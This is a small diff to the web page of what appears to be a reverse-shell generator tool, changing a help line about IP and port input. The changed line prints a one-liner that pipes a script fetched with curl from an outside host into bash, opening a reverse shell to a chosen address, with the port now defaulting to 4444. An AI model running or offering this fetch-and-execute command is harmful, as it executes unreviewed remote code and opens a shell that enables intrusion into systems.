@@ -53,7 +53,7 @@ draft: false
 <button onclick="generateShells()" style="margin-top: 25px;">Generate</button>
 </div>
 <p class="info">💡 Or use URL: <code>?ip:port</code> (e.g., <code>?192.168.1.100:4444</code>)</p>
-<p class="info">⚡ Or directly: <code>curl -sL axolol.fr/r|bash -s 192.168.1.100:4444</code></p>
+<p class="info">⚡ Or directly: <code>curl -sL axolol.fr/r|bash -s 192.168.1.100</code> <span style="color:#666">(<code>:port</code> optional, default 4444)</span></p>
 </div>
 <div id="shells-container" style="display: none;">
 <div id="shells-output"></div>
